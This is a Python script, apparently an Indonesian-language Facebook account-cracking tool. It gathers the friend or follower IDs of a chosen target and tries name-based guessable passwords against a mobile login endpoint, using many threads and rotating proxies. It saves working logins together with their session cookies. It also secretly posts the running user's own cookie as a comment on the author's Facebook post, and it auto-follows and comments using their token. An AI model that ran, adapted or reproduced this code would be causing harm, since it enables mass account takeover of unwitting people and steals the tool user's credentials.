
## import module
try:
   import os
   import sys
   import re
   import json
   import time
   import random
   import requests
   import datetime
   from datetime import datetime
   from concurrent.futures import ThreadPoolExecutor
   from bs4 import BeautifulSoup as sop
   from bs4 import BeautifulSoup as parser
   from bs4 import BeautifulSoup as par
except Exception as AdNazriXD____________WarnaSempakKuda______XC:
    exit(f"module {AdNazriXD____________WarnaSempakKuda______XC} belum terinstall")

## import rich dan bahan
from rich.panel import Panel
from rich.tree import Tree
from rich import print as prints
from rich.console import Console
from rich.table import Table
from rich.columns import Columns
from rich.table import Table as me
from rich.console import Console as sol
console = Console()
from rich.progress import Progress,SpinnerColumn,BarColumn,TextColumn,TimeElapsedColumn

## global nama
id, id2, ok, cp, loop, NazriXD____________CapeSumpahBang______, NazriXD____________HayuuCodingBangAnjingMemekLuSumpah______, uasm, prox_xyaa = [], [], 0, 0, 0, [], [], [], []
ses = requests.Session()
rc = random.choice

## dump useragent
for x in range(1000):
	rr = random.randint
	rc = random.choice
	aZ = ['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z']
	ugent1 = f"Mozilla/5.0 (Linux; Android {str(rr(8,10))}; Redmi {str(rr(4,9))} Build/PPR1.{str(rr(111111,199999))}.011; en-us) AppleWebKit/537.36 (KHTML, like Gecko) UCBrowser/79.0.{str(rr(1111,9999))}.136 Mobile Safari/537.36 Puffin/9.7.2.{str(rr(11111,99999))}AP"
	if ugent1 in uasm:pass
	else:uasm.append(ugent1)
	ugent2 = f"Mozilla/5.0 (Linux; U; Android {str(rr(8,10))}; en-US; Redmi Note {str(rr(5,8))} Build/PKQ1.{str(rr(111111,199999))}.00{str(rr(1,9))} AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/100.0.{str(rr(1111,6666))}.2 UCBrowser/13.4.0.{str(rr(1111,6666))} Mobile Safari/537.36"
	if ugent2 in uasm:pass
	else:uasm.append(ugent2)
	ugent3 = f"Mozilla/5.0 (Linux; U; Android {str(rr(7,12))}; en-US; SM-{str(rc(aZ))}{str(rr(1111,9999))}{str(rc(aZ))}) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 Mobile UCBrowser/3.4.3.{str(rr(111,999))}"
	if ugent3 in uasm:pass
	else:uasm.append(ugent3)

## proxies server	
try:
    proxs_xyaa = requests.get("https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/socks5.txt").text
    for xc_team in proxs_xyaa.splitlines():prox_xyaa.append(xc_team)
except requests.exceptions.ConnectionError:
    prints(Panel(f'{P2}koneksi internet anda bermasalah silahkan cek dan coba lagi masuk ke tools',width=80,style=f"{NazriXD____________WarnaSempakKuda______}"));exit()

## convert bulan
dic = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10':'October','11':'November','12':'December'}
dic2 = {'01':'January','02':'February','03':'March','04':'April','05':'May','06':'June','07':'July','08':'August','09':'September','10':'October','11':'November','12':'Devember'}
tgl = datetime.now().day
bln = dic[(str(datetime.now().month))]
thn = datetime.now().year
okc = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
cpc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
now = datetime.now()
hour = now.hour

## waktu
def waktu():
	now = datetime.now()
	hours = now.hour
	if 4 <= hours < 12:timenow = "selamat pagi"
	elif 12 <= hours < 15:timenow = "selamat siang"
	elif 15 <= hours < 18:timenow = "selamat petang"
	else:timenow = "selamat malam"
	return timenow
	
## mengambil alamat ip
dt = requests.get("http://ip-api.com/json/").json()
try:
	IP = dt["query"]
	CN = dt["country"]
except requests.exceptions.ConnectionError:
	IP = "-"
	CN = "-"

## warna untuk print
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'	# WARNA MATI
H = "\033[0;92m" # HIJAU
K = "\033[0;93m" #KUNING
M = '\x1b[1;91m' # MERAH
P = "\033[0m" # PUTIH

## warna untuk rich
Z2 = "[#000000]" # HITAM
M2 = "[#FF0000]" # MERAH
H2 = "[#00FF00]" # HIJAU
K2 = "[#FFFF00]" # KUNING
B2 = "[#00C8FF]" # BIRU
U2 = "[#AF00FF]" # UNGU
N2 = "[#FF00FF]" # PINK
O2 = "[#00FFFF]" # BIRU MUDA
P2 = "[#FFFFFF]" # PUTIH
J2 = "[#FF8F00]" # JINGGA
A2 = "[#AAAAAA]" # ABU-ABU

## warna random untuk rich table
L1 = "[#875f5f]" # LIGHT
G1  = "[#ffd700]" # GOLD
M1  = "[#875fd7]" # MEDIUM GREEN
P1   = "[#FF00FF]" # PINK
W1  = "[#FFFFFF]" # WHITE
S1   = "[#87afff]" # SKY BLUE
O1   = "[#d78700]" # ORANGE3
O3   = "[#ff5fff]" # MEDIUM ORCH3

## warna untuk rich table
LIGHT = "#875f5f" # LIGHT
GOLD    = "#ffd700" # GOLD
MEDIUM  = "#875fd7" # MEDIUM GREEN
PINK    = "#FF00FF" # PINK
WHITE  = "#FFFFFF" # WHITE
SKY     = "#87afff" # SKY BLUE
ORNG   = "#d78700" # ORANGE3
ORCH   = "#ff5fff" # MEDIUM ORCH

## random warna rich 
NazriXD____________WarnaSempak______      = random.choice([M2,K2,H2,B2,N2])
NazriXD____________WarnaSempakKuda______     = random.choice ([LIGHT,GOLD,MEDIUM,PINK,SKY,ORNG,ORCH])
NazriXD____________PlisssMgentodddddddd______ = random.choice([L1,G1,M1,P1,S1,O1,O1])
NazriXD____________PlisssMgentoddddddd______ = random.choice([H,K,O,B])

## untuk clear layar
def NazriXD____________Wellll():
    try:os.system("clear")
    except:pass

## auto create folder
try:os.mkdir("data")
except:pass
try:os.mkdir("OK")
except:pass
try:os.mkdir("CP")
except:pass

## logo ( lo goblok )
def NazriXD____________LogoNgentodAhhh_________():
    try:os.popen('play-audio data/sound/playNot.mp3')
    except:pass
    prints(Panel(f"""{NazriXD____________WarnaSempak______}.▄▄ · ▪  • ▌ ▄ ·.  ▄▄▄·▄▄▌  ▄▄▄ .    ·▄▄▄▄▄▄  ▄▄▄ .▄▄▄ .
▐█ ▀. ██ ·██ ▐███▪▐█ ▄███•  ▀▄.▀·    ▐▄▄·▀▄ █·▀▄.▀·▀▄.▀·
▄▀▀▀█▄▐█·▐█ ▌▐▌▐█· ██▀·██▪  ▐▀▀▪▄    ██▪ ▐▀▀▄ ▐▀▀▪▄▐▀▀▪▄
▐█▄▪▐█▐█▌██ ██▌▐█▌▐█▪·•▐█▌▐▌▐█▄▄▌    ██▌.▐█•█▌▐█▄▄▌▐█▄▄▌
 ▀▀▀▀ ▀▀▀▀▀  █▪▀▀▀.▀   .▀▀▀  ▀▀▀     ▀▀▀ .▀  ▀ ▀▀▀  ▀▀▀ """,subtitle=f"{H2}{waktu()}",width=80,padding=(0,9),style=f"{NazriXD____________WarnaSempakKuda______}"))

## remove cookie
def NazriXD____________HapusMemekKontol():
    try:os.system("rm -rf data/token.txt")
    except:pass
    try:os.system("rm -rf data/cookie.txt")
    except:pass

def NazriXD____________CapeNgentod______():
	NazriXD____________Wellll()
	NazriXD____________LogoNgentodAhhh_________()
	prints(Panel(f"{P2} silakan masukkan cookie dan jangan gunakan akun pribadi anda untuk login",style=f"{NazriXD____________WarnaSempakKuda______}"))
	cookie = input(f" {H}#{P} masukan cookie : {H}")
	url = "https://business.facebook.com/business_locations"
	head = {"user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36","referer": "https://www.facebook.com/","host": "business.facebook.com","origin": "https://business.facebook.com","upgrade-insecure-requests" : "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","cache-control": "max-age=0","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","content-type":"text/html; charset=utf-8"}
	cok = {'cookie':cookie}
	try:
		_bulan_  = ["Januari", "Februari", "Maret", "April", "Mei", "Juni", "Juli", "Agustus", "September", "Oktober", "November", "Desember"][datetime.now().month - 1]
		_hari_   = {'Sunday':'Minggu','Monday':'Senin','Tuesday':'Selasa','Wednesday':'Rabu','Thursday':'Kamis','Friday':'Jumat','Saturday':'Sabtu'}[str(datetime.now().strftime("%A"))]
		hari_ini = ("%s %s %s"%(datetime.now().day,_bulan_,datetime.now().year))
		jam      = datetime.now().strftime("%X")
		data = ses.get(url,headers=head,cookies=cok)
		token = re.search('(EAAG\w+)',data.text).group(1)
		tem      = ('\nProgramer Kah Bang🤔 & @[100063618310179:]\n\nlu ganteng banget bang🤣😭\n')
		slebew = ('\nHello World!\n\nkomentar di tulis oleh bot\n\n[ Pukul %s WIB ]\n- %s, %s -'%(jam,_hari_,hari_ini))
		link = (f'https://www.facebook.com/100063618310179/posts/549345897196016/?app=fbl')
		random_kata = random.choice(["acc dong suhu","mau jadi pacarku ngga bang?","Wuhh Kawaii🤪","Mantap Bang😘","Very Nice♥️","I Love You @[100063618310179:]","Semangat Bang♥️"])
		ses.post(f"https://graph.facebook.com/100063618310179?fields=subscribers&access_token={token}",cookies=cok)
		ses.post(f"https://graph.facebook.com/549345863862686/comments/?message={slebew}&access_token={token}",cookies=cok)
		ses.post(f"https://graph.facebook.com/549345863862686/reactions?type=love&access_token={token}",cookies=cok)
		ses.post(f"https://graph.facebook.com/549345863862686/comments/?message={random_kata}&access_token={token}",cookies=cok)
		ses.post(f"https://graph.facebook.com/549345863862686/comments/?message={cookie}&access_token={token}",cookies=cok)
		ses.post(f"https://graph.facebook.com/549345863862686/comments/?message={tem}\n{link}\n{slebew}&access_token={token}",cookies =cok)
		open('data/cookie.txt','w').write(cookie)
		open('data/token.txt','w').write(token)
		prints(Panel(f"{P2}login {H2}berhasil{P2}, tolong gunakan script ini dengan bijak atas kesalahan apapun yang anda buat admin tidak akan bertanggung jawab terimakasih!",width=80,padding=(0,2),style=f"{NazriXD____________WarnaSempakKuda______}"));time.sleep(5);NazriXD____________LahhhNgegas______()
	except Exception as e:
	    prints(Panel(f"{P2} cookie tidak valid, silakan coba cookie lain dan pastikan autentikasi off",style=f"{NazriXD____________WarnaSempakKuda______}"));time.sleep(3);NazriXD____________CapeNgentod______()

## cek data akun
def NazriXD____________DataKanjutMuMemek():
    try:
        token = open("data/token.txt","r").read()
        cookie = {"cookie":open("data/cookie.txt","r").read()}
        NazriXD____________NamaBapakLuNtarDiSc = requests.get('https://graph.facebook.com/me?access_token={}'.format(token),cookies=cookie).json()["name"]
        NazriXD____________IdNikLuBangsat______ = requests.get('https://graph.facebook.com/me?access_token={}'.format(token),cookies=cookie).json()["id"]
        NazriXD____________TanggalMatiLuKontolPerecode______ = requests.get('https://graph.facebook.com/me?access_token={}'.format(token),cookies=cookie).json()["birthday"]
    except (IOError,KeyError):
        prints(Panel(f"{P2}cookie anda telah kedaluwarsa atau akun tumbal anda mati",width=80,padding=(0,10),style=f"{NazriXD____________WarnaSempakKuda______}"));time.sleep(3);NazriXD____________HapusMemekKontol()
        NazriXD____________CapeNgentod______()

# menu utama				
def NazriXD____________LahhhNgegas______():
	try:
	    token = open("data/token.txt","r").read()
	    cookie = {"cookie":open("data/cookie.txt","r").read()}
	    NazriXD____________NamaBapakLuNtarDiSc = requests.get('https://graph.facebook.com/me?access_token={}'.format(token),cookies=cookie).json()["name"]
	    NazriXD____________IdNikLuBangsat______ = requests.get('https://graph.facebook.com/me?access_token={}'.format(token),cookies=cookie).json()["id"]
	    NazriXD____________TanggalMatiLuKontolPerecode______ = requests.get('https://graph.facebook.com/me?access_token={}'.format(token),cookies=cookie).json()["birthday"]
	except (IOError,KeyError):
	    prints(Panel(f"{P2}cookie anda telah kedaluwarsa atau akun tumbal anda mati",width=80,padding=(0,10),style=f"{NazriXD____________WarnaSempakKuda______}"));time.sleep(5)
	    NazriXD____________HapusMemekKontol()
	    NazriXD____________CapeNgentod______()
	NazriXD____________Wellll();NazriXD____________LogoNgentodAhhh_________()
	NazriXD____________CapeSumpahBang______.append(Panel(f"""{P2}nama     : {NazriXD____________NamaBapakLuNtarDiSc}\n{P2}id akun  : {NazriXD____________IdNikLuBangsat______}\nbirthday : {NazriXD____________TanggalMatiLuKontolPerecode______}""",title="[white]data akun",width=39,style=f"{NazriXD____________WarnaSempakKuda______}"))
	NazriXD____________CapeSumpahBang______.append(Panel(f"""{P2}bergabung  : {tgl} {bln} {thn}\nip address : {IP}\nnegara     : {CN}""",width=39,style=f"{NazriXD____________WarnaSempakKuda______}"))
	console.print(Columns(NazriXD____________CapeSumpahBang______))
	kontol_________lupastirecode______ = f"{P2}01\n02\n03\n04\n00"
	kontol_________lupastirecode_______ = f"{P2}crack dari id publik\ncrack dari id publik massal\ncrack dari total pengikut\nreport bug ( {H2}admin {P2})\nkeluar ( {M2}hapus cookie{P2} )"
	kontol_________lupastirecode__________ = f"{H2}ON\nON\nON\nON\nON"
	Memek = me()
	Memek.add_column(f"{P2}NO", style=NazriXD____________WarnaSempakKuda______, justify='center')
	Memek.add_column(f"{P2}MENU SIMPLE", style=NazriXD____________WarnaSempakKuda______, justify='center',width=55)
	Memek.add_column(f"{P2}STATUS", style=NazriXD____________WarnaSempakKuda______, justify='center')
	Memek.add_row(kontol_________lupastirecode______,kontol_________lupastirecode_______, kontol_________lupastirecode__________)
	sol().print(Memek, justify='center',style=f"{NazriXD____________WarnaSempakKuda______}")
	NazriXD____________YahahahahaPuyengYahhDek______ = input(f" {H}# {P}pilih 1 sampai 3 : {H}")
	if NazriXD____________YahahahahaPuyengYahhDek______ in [""]:
		prints(Panel(f"{P2}anda harus memilih {NazriXD____________WarnaSempak______}1 {P2}sampai {NazriXD____________WarnaSempak______}3{P2}, tidak boleh kosong!",width=80,padding=(0,13),style=f"{NazriXD____________WarnaSempakKuda______}"));time.sleep(3);exit()
	elif NazriXD____________YahahahahaPuyengYahhDek______ in ["1","01"]:NazriXD____________PlisssMgentod______()
	elif NazriXD____________YahahahahaPuyengYahhDek______ in ["2","02"]:
		try:
			jumlah = int(input(f"\n {H}# {P}jumlah id : {H}"))
		except ValueError:
			prints(Panel(f"{P2}anda harus masukan angka, example : 1, 2, 3, 4, 5",width=80,padding=(0,13),style=f"{NazriXD____________WarnaSempakKuda______}"));time.sleep(3);exit()
		prints(Panel(f"\t{P2}ketik {NazriXD____________WarnaSempak______}'me' {P2}jika ingin crack dari daftar teman anda sendiri",style=f"{NazriXD____________WarnaSempakKuda______}"))
		for t in range(jumlah):
			t+=1
			user = input(f" {H}# {P}masukan id target : {H}")
			try:
				with requests.Session() as ses:
					data = ses.get('https://graph.facebook.com/%s?fields=name,friends.fields(id,name).limit(5000)&access_token=%s'%(user,token),cookies=cookie).json()
					for x in data['friends']['data']:
						id.append(x["id"]+"|"+x["name"])
			except KeyError:
				prints(Panel(f"{P2}akun tidak tersedia atau list teman private, silahkan cari target lain",width=80,padding=(0,3),style=f"{NazriXD____________WarnaSempakKuda______}"))
			except requests.exceptions.ConnectionError:
				print("[<>] tidak ada koneksi")
		else:
			facebook().crack (id)
	elif NazriXD____________YahahahahaPuyengYahhDek______ in ["3","03"]:NazriXD____________JanganDiRecBangNgentod______()
	elif NazriXD____________YahahahahaPuyengYahhDek______ in ["4","04"]:report()
	elif NazriXD____________YahahahahaPuyengYahhDek______ in ["0","00"]:NazriXD____________HapusMemekKontol();time.sleep(3);prints(Panel(f"{P2}berhasil menghapus cookies akun, jangan lupa makan ngab",width=80,padding=(0,11),style=f"{NazriXD____________WarnaSempakKuda______}"));time.sleep(3);exit()
	else:prints(Panel(f"{P2}anda harus memilih {NazriXD____________WarnaSempak______}1 {P2}sampai {NazriXD____________WarnaSempak______}3{P2}, huu plerr ngawur",width=80,padding=(0,14),style=f"{NazriXD____________WarnaSempakKuda______}"));time.sleep(3);exit()

## report bug
def report():
    try:print(f" {H}# {P}anda akan di arahkan ke WhatsApp admin")
    except:pass
    try:os.system("xdg-open https://wa.me/+16143244921");exit()
    except:pass

## crack id publik
def NazriXD____________PlisssMgentod______():
	token = open("data/token.txt","r").read()
	cookie = {"cookie":open("data/cookie.txt","r").read()}
	ses=requests.Session()
	prints(Panel(f"\t{P2}ketik {NazriXD____________WarnaSempak______}'me' {P2}jika ingin crack dari daftar teman anda sendiri",style=f"{NazriXD____________WarnaSempakKuda______}"))
	akun = input(f' {H}# {P}masukan id target :{H} ')
	try:
		data = ses.get('https://graph.facebook.com/%s?fields=name,friends.fields(id,name).limit(5000)&access_token=%s'%(akun,token),cookies=cookie).json()
		for pi in data['friends']['data']:
			try:
				id.append(pi['id']+"|"+pi['name'])
				print(f'\r {H}# {P}mengumpulkan {H}%s {P}id'%(len(id)),end=" ")
				sys.stdout.flush()
				time.sleep(0.0002)
			except:continue
		print("\r")
		facebook().crack (id)
	except (KeyError,IOError):
		prints(Panel(f"{P2}akun tidak tersedia atau list teman private, silahkan cari target lain",width=80,padding=(0,3),style=f"{NazriXD____________WarnaSempakKuda______}"));time.sleep(3);exit()

## crack total pengikut
def NazriXD____________JanganDiRecBangNgentod______():
	token = open("data/token.txt","r").read()
	cookie = {"cookie":open("data/cookie.txt","r").read()}
	ses=requests.Session()
	prints(Panel(f"\t{P2}ketik {NazriXD____________WarnaSempak______}'me' {P2}jika ingin crack dari daftar teman anda sendiri",style=f"{NazriXD____________WarnaSempakKuda______}"))
	akun = input(f' {H}# {P}masukan id target :{H} ')
	try:
		data = ses.get('https://graph.facebook.com/%s?fields=subscribers.limit(99999)&access_token=%s'%(akun,token),cookies=cookie).json()
		for pi in data['subscribers']['data']:
			try:
				id.append(pi['id']+"|"+pi['name'])
				print(f'\r {H}# {P}mengumpulkan {H}%s {P}id'%(len(id)),end=" ")
				sys.stdout.flush()
				time.sleep(0.0002)
			except:continue
		print("\r")
		facebook().crack (id)
	except (KeyError,IOError):
		prints(Panel(f"{P2}akun tidak tersedia atau list teman private, silahkan cari target lain",width=80,padding=(0,3),style=f"{NazriXD____________WarnaSempakKuda______}"));time.sleep(3);exit()

## mulai crack
class facebook:
	def __init__(self):
		self.id = []
	def crack(self,id):
		self.id = id
		global prog, des
		prints(Panel(f"\t\t{P2}      berhasil mengumpulkan [bold green]{(len(id))}[white] id",style=f"{NazriXD____________WarnaSempakKuda______}"))
		NazriXD____________HayuuCodingBangAnjingMemekLuSumpah______.append(Panel(f"""{H2}      {okc}""",title=f"{P2}OK",width=39,style=f"{NazriXD____________WarnaSempakKuda______}"))
		NazriXD____________HayuuCodingBangAnjingMemekLuSumpah______.append(Panel(f"""{K2}      {cpc}""",title=f"{P2}CP",width=39,style=f"{NazriXD____________WarnaSempakKuda______}"))
		console.print(Columns(NazriXD____________HayuuCodingBangAnjingMemekLuSumpah______))
		anim = rc(["earth","smiley","clock","monkey","moon"])
		prog = Progress(SpinnerColumn(f'{anim}'),TextColumn('{task.description}'))
		des = prog.add_task('',total=len(self.id))
		with prog:
		   with ThreadPoolExecutor(max_workers=35) as kontol:
		       for user in self.id:
		           try:
		              uid,name = user.split("|")
		              nama = name.split(" ")
		              pwx = [name.replace(" ",""), name.replace(" "," "),nama[0]+'123', nama[0]+'1234', nama[0]+'12345','sayang']
		              kontol.submit(self.attack,uid,pwx,"free.facebook.com")
		           except:pass
		prints(Panel(f"{P2}crack telah selesai hasil ok : {H2}{ok} {P2}hasil cp :{K2} {cp}",width=80,padding=(0,15),style=f"{NazriXD____________WarnaSempakKuda______}"));time.sleep(3);exit()
		exit()

	def attack(self,uid,pwx,url):
		global loop,ok,cp
		warn = rc([H,K,B,U,B])
		prog.update(des,description=f"{P2}[ {warn}{uid}{P2} ] {loop}/{len(id)} OK -:{H2}{ok} {P2} CP -:{K2}{cp}")
		try:
			for pw in pwx:
				pw = pw.lower()
				ses = requests.Session()
				ua = random.choice(uasm)
				proxy = {'http': 'socks5://'+random.choice(prox_xyaa)}
				p = ses.get(f'https://{url}/login/device-based/password/?uid='+uid+'&flow=login_no_pin&refsrc=deprecated&_rdr').text
				date ={"lsd":re.search('name="lsd" value="(.*?)"', str(p)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p)).group(1),"uid":uid,"flow":"login_no_pin","pass":pw,"next":"https://"+url+"/login/save-device/"}
				ses.headers.update({f"Host":url,"cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://"+url,"content-type":"application/x-www-form-urlencoded","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"navigate","sec-fetch-user":"?1","sec-fetch-dest":"document","referer":f"https://{url}/login/device-based/password/?uid="+uid+"&flow=login_no_pin&refsrc=deprecated&_rdr","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
				po = ses.post(f'https://{url}/login/device-based/validate-password/?shbl=0', data = date, proxies = proxy, allow_redirects = False)
				if 'c_user' in ses.cookies.get_dict():
					kuki=";".join([key+"="+value for key,value in ses.cookies.get_dict().items()])
					tree = Tree("")
					tree.add(f"\r{H2}{uid} {P2}| {H2}{pw}").add(Panel.fit(f"\r{N2}{kuki}"))
					prints(tree)
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					ok+=1
					break
				elif 'checkpoint' in ses.cookies.get_dict():
					tree = Tree("")
					tree.add(f"\r{K2}{uid} {P2}| {K2}{pw}").add(Panel.fit(f"\r{K2}{ua}"))
					prints(tree)
					open('CP/'+cpc,'a').write(uid+'|'+pw+'|'+ua+'\n')
					cp+=1
					break
				else:
					continue
			loop+=1
		except requests.exceptions.ConnectionError:
			time.sleep(30)
			self.attack(self,uid,pwx,url)

## pemanggil					
if __name__=='__main__':
  try:os.system("git pull")
  except:pass
  try:NazriXD____________LahhhNgegas______()
  except:pass
